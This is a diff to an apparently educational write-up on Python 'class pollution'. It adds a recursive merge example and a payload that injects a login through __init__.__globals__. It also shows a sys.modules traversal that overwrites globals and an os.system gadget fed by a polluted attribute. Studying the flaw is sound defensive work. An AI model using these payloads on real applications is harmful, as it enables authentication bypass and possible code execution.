@@ -89,7 +89,10 @@ class MediumTest(Test):
     def health_check(self):
         import os
         print(os.system(f"echo {self.my_value}"))
-
+```
+And try this:
+```python
+# continue with above snippet
 test = mySmallTest()
 print(test.my_value) # test
 print(test.my_small_value) # small
@@ -110,7 +113,7 @@ print(test.my_small_value) # smaller
 test2 = mySmallTest()
 print(test2.my_small_value) # smaller
 ```
-So, we can change the class attributes by changing via `.__class__.<attribute>`. How about `my_value` which is inherit from class `Test`
+So, we can change the class attributes by changing via `<object>.__class__.<attribute>`. How about `my_value` which is inherit from class `Test`
 ```python
 # continue with above snippet
 test3 = Test()
@@ -144,7 +147,7 @@ Moreover, we can access global attributes. The object `test` has a function call
 ```python
 # continue with above snippet
 our_globals_var = "CLEAN"
-print(test.__init__.__globals__) # {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'Test': <class '__main__.Test'>, 'SmallTest': <class '__main__.SmallTest'>, 'mySmallTest': <class '__main__.mySmallTest'>, 'MediumTest': <class '__main__.MediumTest'>, 'test': <__main__.mySmallTest object at 0x000001D7ABB68150>, 'our_globals_var': 'CLEAN'}
+print(test.__init__.__globals__)
 print(our_globals_var) # CLEAN
 test.__init__.__globals__['our_globals_var'] = "POLLUTED"
 print(our_globals_var) # POLLUTED
@@ -171,6 +174,31 @@ myObject.__init__.__globals__['users'][username] = password
 try_login(username, password)
 ```
 
+A more realistic example:
+```python
+# continue with above snippet
+def merge(target, source):
+    if not isinstance(source, dict):
+        return
+    for key in source:
+        source_value = source[key]
+        if isinstance(source_value, dict):
+            if hasattr(target, key):
+                merge(getattr(target, key), source_value)
+            elif key in target:
+                merge(target[key], source_value)
+            else:
+                return
+        else:
+            target.setdefault(key, source_value)
+
+myObject2 = Theme()
+merge(myObject2, {"__init__":{"__globals__":{"users":{"Hacker2": "Evil2"}}}})
+username = "Hacker2"
+password = "Evil2"
+try_login(username, password)
+```
+
 What if the class in different files and import as module
 ```python
 # the_test.py
@@ -189,12 +217,16 @@ print(test.__init__.__globals__)
 There is no `our_globals_var`, that's because it is in `the_test.py` file only, how could we access the globals in this case?
 With some pyjail experience, here is my way of doing so:
 ```python
+# continue with above snippet
 print(test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules['__main__'].our_globals_var) # CLEAN
 test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules['__main__'].our_globals_var = "POLLUTED"
-print(test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules['__main__'].our_globals_var) # POLLUTED
+print(our_globals_var) # POLLUTED
 ```
 Actually, you can see that I mentions module `__main__` in above payload which will returns the main file, or the running context. We can replace it with anything that is imported (you can check by `print(test.__init__.__globals__['__builtins__']['help'].__repr__.__globals__['sys'].modules)`).
 ## Conclusion
 As demonstrated, Class Pollution is an intriguing vulnerability and able to cause catastrophic result.
 ## Reference
+https://portswigger.net/web-security/prototype-pollution
+https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce
+https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf
 https://blog.abdulrah33m.com/prototype-pollution-in-python/
